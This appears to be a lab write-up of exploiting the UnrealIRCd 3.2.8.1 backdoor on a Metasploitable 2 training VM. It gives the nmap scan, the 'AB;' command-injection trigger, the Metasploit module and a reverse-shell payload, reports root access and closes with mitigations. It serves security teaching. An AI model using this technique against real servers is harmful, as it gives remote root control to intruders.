## Project Overview
This project exploits a malicious backdoor found in the UnrealIRCd 3.2.8.1 daemon running on Metasploitable 2. This vulnerability was originally 
caused by a supply chain attack where the source code archive was modified by attackers to include a trigger for remote command execution.

## Environment
* **Attacker:** Kali Linux
* **Victim:** Metasploitable 2
* **Tools Used:** Nmap, Metasploit Framework

## Methodology

### 1. Reconnaissance
Service enumeration identified an IRC server running on port 6667.
* **Command:** `nmap -sV -p 6667 <target-ip>`
* **Result:** UnrealIRCd

### 2. Exploitation
The specific version (3.2.8.1) is known to contain a backdoor triggered by sending the characters "AB;" followed by a system command. 
This was automated using Metasploit.

* **Exploit Module:** `exploit/unix/irc/unreal_ircd_3281_backdoor`
* **Payload:** `cmd/unix/reverse`

### 3. Result / Proof of Concept
A reverse shell connection was established successfully.

* **Command:** `whoami` -> **root**
* **Command:** `id` -> **uid=0(root)**

## Mitigation
1. Verify cryptographic signatures (PGP/MD5) of downloaded software before installation to ensure integrity.
2. Update to a clean, non-compromised version of UnrealIRCd.
3. Implement firewall rules to restrict access to IRC ports.
